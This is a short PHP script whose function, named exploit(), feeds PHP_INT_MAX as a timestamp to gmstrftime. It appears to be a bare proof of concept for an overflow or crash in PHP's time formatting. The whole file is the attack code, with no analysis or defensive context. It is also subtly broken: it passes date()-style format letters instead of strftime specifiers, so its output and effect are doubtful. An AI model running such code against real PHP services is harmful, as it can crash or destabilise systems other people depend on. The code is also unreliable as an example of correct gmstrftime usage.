<?php
function exploit() {
    $timestamp = PHP_INT_MAX;
    $format = "Y-m-d H:i:s";
    $result = gmstrftime($format, $timestamp);
    echo $result;
}

exploit();
?>
